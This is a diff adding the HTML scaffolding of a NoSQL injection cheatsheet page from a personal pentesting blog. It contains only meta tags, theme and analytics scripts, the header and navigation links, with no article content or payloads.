@@ -1,0 +1,2816 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A blog about pentesting, security, and technology.">
+      
+      
+      
+        <link rel="canonical" href="https://tomfieber.github.io/references/cheatsheets/injection-attacks/NoSQL/index.html">
+      
+      
+        <link rel="prev" href="../../CORS/index.html">
+      
+      
+        <link rel="next" href="../OS-command-injection/index.html">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.16">
+    
+    
+      
+        <title>NoSQL Injection - My Personal Site</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+        <script src="https://unpkg.com/iframe-worker/shim"></script>
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-HH4Y2D319L"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-HH4Y2D319L",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-HH4Y2D319L",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="NoSQL Injection - My Personal Site" >
+      
+        <meta  property="og:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/references/cheatsheets/injection-attacks/NoSQL/index.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://tomfieber.github.io/references/cheatsheets/injection-attacks/NoSQL/index.html" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="NoSQL Injection - My Personal Site" >
+      
+        <meta  name="twitter:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/references/cheatsheets/injection-attacks/NoSQL/index.png" >
+      
+    
+    
+   <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#nosql-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../index.html" title="My Personal Site" class="md-header__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Personal Site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              NoSQL Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../index.html" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../about-me/index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  About me
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../blog/index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  References
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../index.html" title="My Personal Site" class="md-nav__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Personal Site
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../about-me/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    About me
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            About me
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about-me/resume.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Resume
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../blog/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Blog
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/archive/2024.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/category/tryhackme.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    tryhackme
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/category/vulnlab.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vulnlab
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/category/writeups.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    writeups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    References
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            References
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cheatsheets
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Cheatsheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../CORS/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    CORS
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            CORS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_2" id="__nav_4_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Injection attacks
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Injection attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2_1" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="index.html" class="md-nav__link md-nav__link--active">
+              
+  
+  
+  <span class="md-ellipsis">
+    NoSQL
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            NoSQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../OS-command-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    OS command injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            OS command injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../SQL-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    SQL injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            SQL injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Methodologies
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Methodologies
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3_1" id="__nav_4_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Infrastructure
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Infrastructure
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
